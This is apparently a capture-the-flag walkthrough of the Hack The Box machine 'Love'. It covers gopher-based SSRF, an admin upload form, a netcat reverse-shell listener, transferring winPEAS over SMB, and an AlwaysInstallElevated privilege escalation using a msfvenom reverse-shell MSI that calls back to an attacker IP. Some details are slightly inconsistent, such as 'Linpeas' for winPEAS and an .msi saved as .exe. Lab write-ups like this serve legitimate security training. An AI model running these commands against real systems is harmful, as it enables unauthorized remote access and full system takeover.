Enumerating the Web Application

I start with enumerating the web application on port 80 & 443.

From the nmap script output I know that there is a subdomain staging.love.htb, so I add it to my /etc/hosts file. The main page shows a subscription form that does not do anything, but other than that I do not find anything else interesting. The /demo page however has the functionality that it will download any file linked in the form.

I first try to use SSRF to visit pages on the localhost to see if there is anything different, but this yielded nothing at first. So in the back ground I start running gobuster to find hidden files on the main website. Meanwhile, I observe that the gopher protocol is allowed and I try to access port 3306. However I get an error that the host Love is not allowed to connect.

SSRF attempt with the gopher protocol.

Combining the SSRF vulnerability with the results from gobuster I start exploring the love.htb/admin/ section of the web application. Through exploration I discover that there is a form on love.htb/admin/candidates.php that allows adding new candidates. To add a new candidate, the form makes a POST request to love.htb/admin/candidates_add.php.

Triggering the reverse-shell.

To catch the shell I run the following:

rlwrap nc -nlvp 9001

The shell is running under the Phoebe user and can grab the user flag from C:\Users\Phoebe\Desktop\user.txt. After grabbing the flag I setup a local SMB server using impacket-smbserver share /tmp to copy over the winPEASx64 binary using copy \\10.10.14.207\share\winPEASx64.exe winpeas.exe.

Privilege Escalation

Linpeas shows that the AlwaysInstallElevated key is set to 1. This means that installers will be run as Administrator without requiring credentials.

So I generate a .msi file that contains a reversehell back to me using msfvenom:

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9002 -f msi > revshell.exe

Next, I copy over the reverse shell using my SMB server and catch the reverse shell and obtain a shell running as NT AUTHORITY/SYSTEM.
